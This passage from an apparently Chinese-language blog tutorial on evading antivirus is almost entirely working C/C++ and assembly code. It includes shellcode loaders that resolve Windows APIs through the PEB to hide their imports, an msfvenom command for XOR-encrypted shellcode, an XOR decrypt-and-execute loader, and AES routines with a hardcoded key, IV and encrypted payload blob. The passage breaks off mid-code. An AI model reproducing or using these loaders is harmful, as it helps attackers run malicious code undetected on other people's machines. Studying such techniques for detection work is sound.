class=\"line\">\t\t\t\tchar* pFunName &#x3D; (char*)(kernelbase + dwNameOffset);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t\tif (strcmp(pFunName, &quot;GetProcAddress&quot;) &#x3D;&#x3D; 0)</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\tprintf(&quot;[+]GetProcAddress Addr: 0x%p\\n&quot;, dwFunAddrOffset + kernelbase);</span><br><span class=\"line\">\t\t\t\t\treturn dwFunAddrOffset + kernelbase;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 根据原函数结构,声明定义api函数</span><br><span class=\"line\">typedef FARPROC(WINAPI* pGetProcAddress)(_In_ HMODULE hModule, _In_ LPCSTR lpProcName);</span><br><span class=\"line\">typedef BOOL(WINAPI* pVirtualProtect)(LPVOID, DWORD, DWORD, PDWORD);</span><br><span class=\"line\">typedef HANDLE(WINAPI* pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);</span><br><span class=\"line\">typedef DWORD(WINAPI* pWaitForSingleObject)(HANDLE, DWORD);</span><br><span class=\"line\"></span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t&#x2F;&#x2F; kernel32地址</span><br><span class=\"line\">\tHMODULE kernelbase &#x3D; (HMODULE)GetKernel32Address();</span><br><span class=\"line\">\t&#x2F;&#x2F; GetProcAddress函数地址</span><br><span class=\"line\">\tpGetProcAddress MyGetProcAddress &#x3D; (pGetProcAddress)RGetProcAddress(kernelbase);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t&#x2F;&#x2F;开始获取各种函数</span><br><span class=\"line\">\tpVirtualProtect MyVirtualProtect &#x3D; (pVirtualProtect)MyGetProcAddress(kernelbase, &quot;VirtualProtect&quot;);</span><br><span class=\"line\">\tpCreateThread MyCreateThread &#x3D; (pCreateThread)MyGetProcAddress(kernelbase, &quot;CreateThread&quot;);</span><br><span class=\"line\">\tpWaitForSingleObject MyWaitForSingleObject &#x3D; (pWaitForSingleObject)MyGetProcAddress(kernelbase, &quot;WaitForSingleObject&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; 组合加载shellcode</span><br><span class=\"line\">\tDWORD oldProtect;</span><br><span class=\"line\">\tMyVirtualProtect((LPVOID)buf, sizeof(buf), PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class=\"line\">\tHANDLE hThread &#x3D; MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)(LPVOID)buf, NULL, 0, NULL);</span><br><span class=\"line\">\tMyWaitForSingleObject(hThread, INFINITE);</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>x64</strong>，默认无法使用汇编</p>\n<p>在项目中右键新建项 <code>GetInitializationOrderModuleList.asm</code> ，用于获取 <code>InitializationOrderModuleList</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">.CODE</span><br><span class=\"line\">    GetInInitializationOrderModuleList PROC</span><br><span class=\"line\">    mov rax,gs:[60h]</span><br><span class=\"line\">    mov rax,[rax+18h]</span><br><span class=\"line\">    mov rax,[rax+30h]</span><br><span class=\"line\">    ret</span><br><span class=\"line\">    GetInInitializationOrderModuleList ENDP</span><br><span class=\"line\">END</span><br></pre></td></tr></table></figure>\n\n<p>右键单击新建的asm文件, 选择属性, 在常规选项处将 <code>从生成中排除</code> 设置为 <code>否</code>, 项类型设置为 <code>自定义生成工具</code></p>\n<p>在自定义生成工具选项处</p>\n<p>在命令行框输入 <code>ml64 /Fo $(IntDir)%(fileName).obj /c %(fileName).asm</code></p>\n<p>在输出框输入 <code>$(IntDir)%(FileName).obj</code></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240410162639824.png\"></p>\n<p>打开项目属性，勾选 <code>C/C++-&gt;代码生成-&gt;禁用安全检查</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">unsigned char buf[] &#x3D; &quot;shellcode is here&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 声明获取 InInitializationOrderModuleList 链表的函数</span><br><span class=\"line\">extern &quot;C&quot; PVOID __stdcall GetInInitializationOrderModuleList();</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; UNICODE_STRING 结构体定义</span><br><span class=\"line\">typedef struct _UNICODE_STRING &#123;</span><br><span class=\"line\">    USHORT Length;  &#x2F;&#x2F;表示字符串中的字符数,由于它是unicode形式的字符,因此每个字符占两个字节</span><br><span class=\"line\">    USHORT MaximumLength;  &#x2F;&#x2F;分配的内存空间的大小，以字节为单位</span><br><span class=\"line\">    PWSTR Buffer;  &#x2F;&#x2F;表示指向存储Unicode字符串的字符数组的指针</span><br><span class=\"line\">&#125; UNICODE_STRING, * PUNICODE_STRING;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 获取 Kernel32.dll 的基地址</span><br><span class=\"line\">HMODULE GetKernel32Address() &#123;</span><br><span class=\"line\">    &#x2F;&#x2F; 获取 InInitializationOrderModuleList 链表</span><br><span class=\"line\">    LIST_ENTRY* pNode &#x3D; (LIST_ENTRY*)GetInInitializationOrderModuleList();</span><br><span class=\"line\">    while (1) &#123;</span><br><span class=\"line\">        &#x2F;&#x2F; 获取 FullDllName 成员</span><br><span class=\"line\">        UNICODE_STRING* FullDllName &#x3D; (UNICODE_STRING*)((BYTE*)pNode + 0x38);</span><br><span class=\"line\">        &#x2F;&#x2F; 如果 Buffer 中的第 13 个字符为空字符，则已找到 Kernel32.dll</span><br><span class=\"line\">        if (*(FullDllName-&gt;Buffer + 12) &#x3D;&#x3D; &#39;\\0&#39;) &#123;</span><br><span class=\"line\">            &#x2F;&#x2F; 返回模块的基地址</span><br><span class=\"line\">            return (HMODULE)(*((ULONG64*)((BYTE*)pNode + 0x10)));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        pNode &#x3D; pNode-&gt;Flink;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 获取 GetProcAddress 函数的地址</span><br><span class=\"line\">DWORD64 RGetProcAddress(HMODULE hKernal32) &#123;</span><br><span class=\"line\">    &#x2F;&#x2F; 获取 DOS 头</span><br><span class=\"line\">    PIMAGE_DOS_HEADER baseAddr &#x3D; (PIMAGE_DOS_HEADER)hKernal32;</span><br><span class=\"line\">    &#x2F;&#x2F; 获取 NT 头</span><br><span class=\"line\">    PIMAGE_NT_HEADERS pImageNt &#x3D; (PIMAGE_NT_HEADERS)((LONG64)baseAddr + baseAddr-&gt;e_lfanew);</span><br><span class=\"line\">    &#x2F;&#x2F; 获取导出表</span><br><span class=\"line\">    PIMAGE_EXPORT_DIRECTORY exportDir &#x3D; (PIMAGE_EXPORT_DIRECTORY)((LONG64)baseAddr + pImageNt-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);</span><br><span class=\"line\">    &#x2F;&#x2F; 获取导出函数地址数组、导出函数名数组和导出函数序号数组</span><br><span class=\"line\">    PULONG RVAFunctions &#x3D; (PULONG)((LONG64)baseAddr + exportDir-&gt;AddressOfFunctions);</span><br><span class=\"line\">    PULONG RVANames &#x3D; (PULONG)((LONG64)baseAddr + exportDir-&gt;AddressOfNames);</span><br><span class=\"line\">    PUSHORT AddressOfNameOrdinals &#x3D; (PUSHORT)((LONG64)baseAddr + exportDir-&gt;AddressOfNameOrdinals);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F; 遍历导出函数</span><br><span class=\"line\">    for (size_t i &#x3D; 0; i &lt; exportDir-&gt;NumberOfNames; i++) &#123;</span><br><span class=\"line\">        &#x2F;&#x2F; 获取当前函数地址</span><br><span class=\"line\">        LONG64 F_va_Tmp &#x3D; (ULONG64)((LONG64)baseAddr + RVAFunctions[(USHORT)AddressOfNameOrdinals[i]]);</span><br><span class=\"line\">        &#x2F;&#x2F; 获取当前函数名地址</span><br><span class=\"line\">        PUCHAR FunctionName &#x3D; (PUCHAR)((LONG64)baseAddr + RVANames[i]);</span><br><span class=\"line\">        &#x2F;&#x2F; 如果当前函数名是 &quot;GetProcAddress&quot;，返回其地址</span><br><span class=\"line\">        if (!strcmp((const char*)FunctionName, &quot;GetProcAddress&quot;)) &#123;</span><br><span class=\"line\">            return F_va_Tmp;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 定义函数指针类型</span><br><span class=\"line\">typedef FARPROC(WINAPI* pGetProcAddress)(HMODULE, LPCSTR);</span><br><span class=\"line\">typedef BOOL(WINAPI* pVirtualProtect)(LPVOID, DWORD, DWORD, PDWORD);</span><br><span class=\"line\">typedef HANDLE(WINAPI* pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);</span><br><span class=\"line\">typedef DWORD(WINAPI* pWaitForSingleObject)(HANDLE, DWORD);</span><br><span class=\"line\"></span><br><span class=\"line\">int main() &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F; 获取 Kernel32.dll 的基地址和GetProcAddress函数地址</span><br><span class=\"line\">    HMODULE hKernal32 &#x3D; GetKernel32Address();</span><br><span class=\"line\">    pGetProcAddress MyGetProcAddress &#x3D; (pGetProcAddress)RGetProcAddress(hKernal32);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F;开始获取各种函数</span><br><span class=\"line\">    pVirtualProtect MyVirtualProtect &#x3D; (pVirtualProtect)MyGetProcAddress(hKernal32, &quot;VirtualProtect&quot;);</span><br><span class=\"line\">    pCreateThread MyCreateThread &#x3D; (pCreateThread)MyGetProcAddress(hKernal32, &quot;CreateThread&quot;);</span><br><span class=\"line\">    pWaitForSingleObject MyWaitForSingleObject &#x3D; (pWaitForSingleObject)MyGetProcAddress(hKernal32, &quot;WaitForSingleObject&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F; 组合加载shellcode</span><br><span class=\"line\">    DWORD oldProtect;</span><br><span class=\"line\">    MyVirtualProtect((LPVOID)buf, sizeof(buf), PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class=\"line\">    HANDLE hThread &#x3D; MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)(LPVOID)buf, NULL, 0, NULL);</span><br><span class=\"line\">    MyWaitForSingleObject(hThread, INFINITE);</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>参考：</p>\n<p><a href=\"http://www.pentester.top/index.php/archives/65/\">免杀技巧之API动态加载技术</a></p>\n<p><a href=\"https://idiotc4t.com/defense-evasion/overwrite-winapi-bypassav\">通过重写ring3 API函数实现免杀</a></p>\n<p><a href=\"https://cloud.tencent.com/developer/video/34367\">动态调用系统API避免导入表检测</a></p>\n<p><a href=\"https://xz.aliyun.com/t/12035?time__1311=mqmhBKD50KGK4WqGNDQbiQvdS4NwPGOb8eD&alichlgref=https://cn.bing.com/\">通过隐藏导入表的方式规避杀软</a></p>\n<p>工具：</p>\n<p><a href=\"https://github.com/JustasMasiulis/lazy_importer\">lazy_importer: library for importing functions from dlls in a hidden, reverse engineer unfriendly way</a></p>\n<h2 id=\"进程注入-x\"><a href=\"#进程注入-x\" class=\"headerlink\" title=\"进程注入(x)\"></a>进程注入(x)</h2><p>大块内容，暂时挖坑</p>\n<p><a href=\"https://bbs.kanxue.com/thread-271554.htm\">高级进程注入总结</a></p>\n<p><a href=\"https://www.cnblogs.com/bonelee/p/15957493.html\">进程注入、代码注入、傀儡注入检测</a></p>\n<p><a href=\"https://www.cnblogs.com/LittleHann/p/6336950.html\">Windows Process Injection(Windows进程注入)</a></p>\n<p><a href=\"https://www.elastic.co/cn/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\">Ten process injection techniques: A technical survey of common and trending process injection techniques | Elastic Blog</a></p>\n<p><a href=\"https://www.secforce.com/blog/dll-hollowing-a-deep-dive-into-a-stealthier-memory-allocation-variant/\">SECFORCE - Security without compromise</a></p>\n<p><a href=\"https://trustedsec.com/blog/burrowing-a-hollow-in-a-dll-to-hide\">TrustedSec | Burrowing a Hollow in a DLL to Hide</a></p>\n<p><a href=\"https://blog.f-secure.com/hiding-malicious-code-with-module-stomping/\">Hiding malicious code with “Module Stomping”: Part 1 - F-Secure Blog</a></p>\n<p><a href=\"https://blog.omroot.io/process-code-injection-through-undocumented-ntapis/\">Process Code Injection Through Undocumented NTAPI (omroot.io)</a></p>\n<h1 id=\"shellcode的混淆加密\"><a href=\"#shellcode的混淆加密\" class=\"headerlink\" title=\"shellcode的混淆加密\"></a>shellcode的混淆加密</h1><p>针对shellcode不同的加密方式</p>\n<h2 id=\"XOR\"><a href=\"#XOR\" class=\"headerlink\" title=\"XOR\"></a>XOR</h2><p>shellcode生成</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">msfvenom -p windows&#x2F;x64&#x2F;exec cmd&#x3D;&quot;calc.exe&quot; --encrypt xor -f c -o shellcode.c --encrypt-key test</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">unsigned char encshellcode[] &#x3D; &quot;xor shellcode is here&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">int main() &#123;</span><br><span class=\"line\">    int buflen &#x3D; sizeof encshellcode;</span><br><span class=\"line\">    char key[] &#x3D; &quot;test&quot;;</span><br><span class=\"line\">    unsigned char shellcode[sizeof encshellcode];</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F; XOR 解密</span><br><span class=\"line\">    int j &#x3D; 0;</span><br><span class=\"line\">    for (int i &#x3D; 0; i &lt; sizeof encshellcode; i++) &#123;</span><br><span class=\"line\">        if (j &#x3D;&#x3D; sizeof key - 1) j &#x3D; 0;</span><br><span class=\"line\">        shellcode[i] &#x3D; encshellcode[i] ^ key[j];</span><br><span class=\"line\">        j++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    for (int i &#x3D; 0; i &lt; sizeof shellcode; i++) &#123;</span><br><span class=\"line\">        printf(&quot;\\\\x%02x&quot;, shellcode[i]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    void* exec &#x3D; VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">    memcpy(exec, shellcode, sizeof shellcode);</span><br><span class=\"line\">    ((void(*)())exec)();</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>tips：使用 InterlockedXor 进行平替异或符号，<a href=\"https://saucer-man.com/operation_and_maintenance/465.html#cl-1\">加载混淆的shellcode实现静态免杀</a></p>\n<h2 id=\"AES\"><a href=\"#AES\" class=\"headerlink\" title=\"AES\"></a>AES</h2><p>导入aes模块：<a href=\"https://github.com/xf555er/ShellcodeEncryption/tree/master/aes%E5%8A%A0%E5%AF%86\">ShellcodeEncryption/aes加密 </a></p>\n<p>项目结构如下</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240410231219455.png\" alt=\"image-20240410231219455\"></p>\n<p>tools.h</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &quot;AES.h&quot;</span><br><span class=\"line\">#include &quot;Base64.h&quot;</span><br><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">#include &lt;random&gt;</span><br><span class=\"line\">#include &lt;sstream&gt;</span><br><span class=\"line\">#include &lt;iomanip&gt;</span><br><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\">#include &lt;tchar.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">string EncryptionAES(const string&amp; strSrc, const char* g_key, const char* g_iv);</span><br><span class=\"line\"></span><br><span class=\"line\">string DecryptionAES(const string&amp; strSrc, const char* g_key, const char* g_iv);</span><br><span class=\"line\"></span><br><span class=\"line\">string random_string(size_t length);</span><br><span class=\"line\"></span><br><span class=\"line\">string toHexString(unsigned char* data, size_t len);</span><br></pre></td></tr></table></figure>\n\n<p>tools.cpp</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &quot;tools.h&quot;</span><br><span class=\"line\">#define BUF_SIZE 4096</span><br><span class=\"line\"></span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\"></span><br><span class=\"line\">string EncryptionAES(const string&amp; strSrc, const char* g_key, const char* g_iv) &#123;</span><br><span class=\"line\">\tsize_t length &#x3D; strSrc.length();</span><br><span class=\"line\">\tint block_num &#x3D; length &#x2F; BLOCK_SIZE + 1;</span><br><span class=\"line\">\t&#x2F;&#x2F;明文</span><br><span class=\"line\">\tchar* szDataIn &#x3D; new char[block_num * BLOCK_SIZE + 1];</span><br><span class=\"line\">\tmemset(szDataIn, 0x00, block_num * BLOCK_SIZE + 1);</span><br><span class=\"line\">\tstrcpy(szDataIn, strSrc.c_str());</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F;进行PKCS7Padding填充。</span><br><span class=\"line\">\tint k &#x3D; length % BLOCK_SIZE;</span><br><span class=\"line\">\tint j &#x3D; length &#x2F; BLOCK_SIZE;</span><br><span class=\"line\">\tint padding &#x3D; BLOCK_SIZE - k;</span><br><span class=\"line\">\tfor (int i &#x3D; 0; i &lt; padding; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tszDataIn[j * BLOCK_SIZE + k + i] &#x3D; padding;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tszDataIn[block_num * BLOCK_SIZE] &#x3D; &#39;\\0&#39;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F;加密后的密文</span><br><span class=\"line\">\tchar* szDataOut &#x3D; new char[block_num * BLOCK_SIZE + 1];</span><br><span class=\"line\">\tmemset(szDataOut, 0, block_num * BLOCK_SIZE + 1);</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F;进行进行AES的CBC模式加密</span><br><span class=\"line\">\tAES aes;</span><br><span class=\"line\">\taes.MakeKey(g_key, g_iv, 16, 16);</span><br><span class=\"line\">\taes.Encrypt(szDataIn, szDataOut, block_num * BLOCK_SIZE, AES::CBC);</span><br><span class=\"line\">\tstring str &#x3D; base64_encode((unsigned char*)szDataOut,</span><br><span class=\"line\">\t\tblock_num * BLOCK_SIZE);</span><br><span class=\"line\">\tdelete[] szDataIn;</span><br><span class=\"line\">\tdelete[] szDataOut;</span><br><span class=\"line\">\treturn str;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">string DecryptionAES(const string&amp; strSrc, const char* g_key, const char* g_iv) &#123;</span><br><span class=\"line\">\tstring strData &#x3D; base64_decode(strSrc);</span><br><span class=\"line\">\tsize_t length &#x3D; strData.length();</span><br><span class=\"line\">\t&#x2F;&#x2F;密文</span><br><span class=\"line\">\tchar* szDataIn &#x3D; new char[length + 1];</span><br><span class=\"line\">\tmemcpy(szDataIn, strData.c_str(), length + 1);</span><br><span class=\"line\">\t&#x2F;&#x2F;明文</span><br><span class=\"line\">\tchar* szDataOut &#x3D; new char[length + 1];</span><br><span class=\"line\">\tmemcpy(szDataOut, strData.c_str(), length + 1);</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F;进行AES的CBC模式解密</span><br><span class=\"line\">\tAES aes;</span><br><span class=\"line\">\taes.MakeKey(g_key, g_iv, 16, 16);</span><br><span class=\"line\">\taes.Decrypt(szDataIn, szDataOut, length, AES::CBC);</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F;去PKCS7Padding填充</span><br><span class=\"line\">\tif (0x00 &lt; szDataOut[length - 1] &lt;&#x3D; 0x16)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tint tmp &#x3D; szDataOut[length - 1];</span><br><span class=\"line\">\t\tfor (int i &#x3D; length - 1; i &gt;&#x3D; length - tmp; i--)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tif (szDataOut[i] !&#x3D; tmp)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tmemset(szDataOut, 0, length);</span><br><span class=\"line\">\t\t\t\tcout &lt;&lt; &quot;去填充失败！解密出错！！&quot; &lt;&lt; endl;</span><br><span class=\"line\">\t\t\t\tbreak;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\telse</span><br><span class=\"line\">\t\t\t\tszDataOut[i] &#x3D; 0;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tstring strDest(szDataOut);</span><br><span class=\"line\">\tdelete[] szDataIn;</span><br><span class=\"line\">\tdelete[] szDataOut;</span><br><span class=\"line\">\treturn strDest;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">string random_string(size_t length)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tauto randchar &#x3D; []() -&gt; char</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tconst char charset[] &#x3D;</span><br><span class=\"line\">\t\t\t\t&quot;0123456789&quot;</span><br><span class=\"line\">\t\t\t\t&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br><span class=\"line\">\t\t\t\t&quot;abcdefghijklmnopqrstuvwxyz&quot;</span><br><span class=\"line\">\t\t\t\t&quot;!@#$%^&amp;*()_+&#x3D;-[]&#123;&#125;;:,.&lt;&gt;&#x2F;?|&quot;;</span><br><span class=\"line\">\t\t\tconst size_t max_index &#x3D; (sizeof(charset) - 1);</span><br><span class=\"line\">\t\t\treturn charset[rand() % max_index];</span><br><span class=\"line\">\t\t&#125;;</span><br><span class=\"line\">\tstring str(length, 0);</span><br><span class=\"line\">\tgenerate_n(str.begin(), length, randchar);</span><br><span class=\"line\">\treturn str;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">string toHexString(unsigned char* data, size_t len)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tostringstream oss;</span><br><span class=\"line\">\tfor (size_t i &#x3D; 0; i &lt; len; ++i)</span><br><span class=\"line\">\t\toss &lt;&lt; hex &lt;&lt; setw(2) &lt;&lt; setfill(&#39;0&#39;) &lt;&lt; static_cast&lt;int&gt;(data[i]);</span><br><span class=\"line\">\treturn oss.str();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>shellcode_enc.cpp 用于生成key与iv，并将shellcode加密</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">#include &quot;tools.h&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\"></span><br><span class=\"line\">int main() &#123;</span><br><span class=\"line\">\tunsigned char buf[] &#x3D; &quot;shellcode is here&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F;生成随机16位的key值和iv值</span><br><span class=\"line\">\tsrand(time(0)); &#x2F;&#x2F; initialize random seed</span><br><span class=\"line\">\tstring g_key &#x3D; random_string(16);</span><br><span class=\"line\">\tstring g_iv &#x3D; random_string(16);</span><br><span class=\"line\">\tcout &lt;&lt; &quot;[+]key值: &quot; &lt;&lt; g_key &lt;&lt; endl;</span><br><span class=\"line\">\tcout &lt;&lt; &quot;[+]iv值: &quot; &lt;&lt; g_iv &lt;&lt; endl;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F;将shellcode字节数组转换成十六进制字符串</span><br><span class=\"line\">\tsize_t bufLen &#x3D; sizeof(buf) &#x2F; sizeof(unsigned char) - 1;</span><br><span class=\"line\">\tstring OriginalShellcode &#x3D; toHexString(buf, bufLen);</span><br><span class=\"line\">\tcout &lt;&lt; &quot;[+]未加密的shellcode: &quot; &lt;&lt; OriginalShellcode &lt;&lt; endl;</span><br><span class=\"line\">\t&#x2F;&#x2F;对shellcode字符串进行加密</span><br><span class=\"line\">\tstring EncryptShellcode &#x3D; EncryptionAES(OriginalShellcode, g_key.c_str(), g_iv.c_str());</span><br><span class=\"line\">\tcout &lt;&lt; &quot;[+]加密后的shellcode: &quot; &lt;&lt; EncryptShellcode &lt;&lt; endl;</span><br><span class=\"line\">\t&#x2F;&#x2F;对加密后的shellcode字符串进行解密</span><br><span class=\"line\">\tstring DecryptShellcode &#x3D; DecryptionAES(EncryptShellcode, g_key.c_str(), g_iv.c_str());</span><br><span class=\"line\">\tcout &lt;&lt; &quot;[+]解密后的shellcode: &quot; &lt;&lt; DecryptShellcode &lt;&lt; endl;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240410231122463.png\" alt=\"image-20240410231122463\"></p>\n<p>然后在main.cpp中进行解密与加载shellcode</p>\n<p>main.cpp</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">#include &quot;AES.h&quot;</span><br><span class=\"line\">#include &quot;Base64.h&quot;</span><br><span class=\"line\">#include &quot;tools.h&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\"></span><br><span class=\"line\">int main() &#123;</span><br><span class=\"line\">    char g_key[17] &#x3D; &quot;o+aMJ3dY7Wy&amp;v&lt;Me&quot;;   &#x2F;&#x2F;填写key密钥</span><br><span class=\"line\">    char g_iv[17] &#x3D; &quot;cz-ax@RDj].62&#123;c;&quot;;  &#x2F;&#x2F;定义iv向量</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; 加密后的shellcode</span><br><span class=\"line\">\tstring buf &#x3D; &quot;HBqjD&#x2F;JxIjs7hoFY+ujH2xb&#x2F;7c9oOoHrxhRH84xVGjBV+Na0IdYACn4kPVd2Rnmb3Jk9Uxpsr8diLtRodIVWJOS1&#x2F;qG0DG+YvNvc1sqhxNjRadalgWbDcIYhKVO8EGBM+5Sfluez&#x2F;acKdyQjeRScESS9RyUxRgcd5Z1OOHDqmrTLKgXLsYxyFMRRD+Mq25LFMEzOxfUglIqi8OR74p4FMVf3Oinx2SxOfkglfQkcXvkUUdMfMb5nIhPv7IuPxJApPbF7zs8g&#x2F;kbN6NgcI0CpCIxWu8epxAeRC2gqhgzCkV50iZDPzFXK5q+PP9STOdgzDI&#x2F;xBnw2TmQGwnJIFgFbWZ69IpFImH5Lq3qniDzpQlV2wS0Q29tOR37rg+xLdyO5P2VVdEGOummQVjTQBKRJ9tfme69kHuvPSvXMMtvH1UHfTy9fdDpnPqCYWAbp0wz1W34yZZpX0gJA1HRzTxR0Jo176UOY4EoqxLL5rLie1e1b198b0gWMi3FUosTHMP+1aGx2WJZONE8EVSFfGP8lEa3anQSx&#x2F;J1ZrZheltCXJ6VKUMTUIA&#x2F;yMT+2hIBcMUgG&#x2F;W9wYgv9xWYFLryxqHVSD45bDlTewwQjI6uI1xLau8VP2abmJQLbJt4BxlEr1pCdzZl+slhpDkT8lOD&#x2F;u82&#x2F;rMymdedmgMVJMnOG8B9cdK4ilzY9dR1jQGZS4PVwg0gvZbPz7pVlLpHfj5qnD4c3k5BdcvFS+Z+XbCLE5+R7AuU&#x3D;&quot;;</span><br><span class=\"line\">\t&#x2F;&#x2F; 解密shellcode</span><br><span class=\"line\">\tstring strbuf &#x3D; DecryptionAES(buf, g_key, g_iv);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t&#x2F;&#x2F;将解密的shellcode放到shellcode数组中</span><br><span class=\"line\">\tchar* p &#x3D; (char*)strbuf.c_str();</span><br><span class=\"line\">\tunsigned char* shellcode &#x3D; (unsigned char*)calloc(strbuf.length() &#x2F; 2, sizeof(unsigned char));</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t&#x2F;&#x2F; 两字节的输入到shellcode地址中，所以长度为一半</span><br><span class=\"line\">\tfor (size_t i &#x3D; 0; i &lt; strbuf.length() &#x2F; 2; i++) &#123;</span><br><span class=\"line\">\t\tsscanf(p, &quot;%02x&quot;, &amp;shellcode[i]);</span><br><span class=\"line\">\t\tp +&#x3D; 2;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F;输出shellcode数组里的内容</span><br><span class=\"line\">\tint ShellcodeSize &#x3D; strbuf.length() &#x2F; 2;</span><br><span class=\"line\"></span><br><span 